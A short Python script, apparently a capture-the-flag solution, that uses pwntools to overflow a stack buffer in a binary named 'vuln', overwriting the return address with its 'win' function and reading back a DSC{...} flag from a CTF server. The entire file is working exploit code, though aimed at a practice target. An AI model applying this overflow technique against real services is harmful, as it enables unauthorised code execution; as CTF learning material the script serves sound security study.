import re
import struct

from pwnlib.context import context
from pwnlib.elf import ELF
from pwnlib.tubes.remote import remote
from pwnlib.util.cyclic import cyclic


def main():
    context(arch="amd64")
    vuln = ELF("vuln")
    payload = cyclic(56) + struct.pack("<Q", vuln.functions.win.address)

    conn = remote("ctf.dscmunich.de", 10001)
    conn.recvuntil(b"How many characters will your message have?\n")
    conn.send(f"{len(payload)}\n".encode())
    conn.recvline()

    conn.send(payload)
    flag = re.search(r"DSC\{.+}", conn.recvallS()).group(0)
    print(flag)


if __name__ == '__main__':
    main()
